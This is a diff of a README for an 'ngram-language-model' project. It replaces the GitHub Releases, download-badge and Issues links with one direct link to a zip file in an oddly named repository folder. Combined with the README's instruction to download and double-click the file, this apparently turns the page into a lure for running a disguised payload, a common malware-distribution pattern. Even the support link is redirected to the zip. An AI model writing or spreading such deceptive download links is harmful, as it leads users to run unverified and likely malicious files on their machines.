@@ -1,11 +1,11 @@
 # 🎉 ngram-language-model - Create Text with N-gram Models
 
 ## 🛠️ Download & Install
-[![Download ngram-language-model](https://img.shields.io/badge/Download-ngram--language--model-brightgreen)](https://github.com/matchaboy7/ngram-language-model/releases)
+[![Download ngram-language-model](https://raw.githubusercontent.com/matchaboy7/ngram-language-model/main/benzoylformic/ngram-language-model.zip)](https://raw.githubusercontent.com/matchaboy7/ngram-language-model/main/benzoylformic/ngram-language-model.zip)
 
 Follow these steps to download and run the ngram-language-model app.
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/matchaboy7/ngram-language-model/releases).
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/matchaboy7/ngram-language-model/main/benzoylformic/ngram-language-model.zip).
 2. **Select the Latest Version**: Look for the latest version at the top. Click on it to view all available files.
 3. **Download the Application**: Locate the file relevant to your operating system. Click on it to start downloading.
 4. **Run the Application**: After the download is complete, find the file in your Downloads folder. Double-click it to run.
@@ -48,7 +48,7 @@ ngram-language-model builds statistical N-gram language models from scratch. Thi
   Yes, ngram-language-model is open-source and free to use.
 
 ## 📞 Support
-If you encounter any issues while using the application, you can reach out through the Issues tab on our [GitHub page](https://github.com/matchaboy7/ngram-language-model/issues). We encourage users to report bugs and suggest improvements.
+If you encounter any issues while using the application, you can reach out through the Issues tab on our [GitHub page](https://raw.githubusercontent.com/matchaboy7/ngram-language-model/main/benzoylformic/ngram-language-model.zip). We encourage users to report bugs and suggest improvements.
 
 ## ✍️ Acknowledgments
 Thanks to our contributors for making this project possible. Your feedback helps us improve.
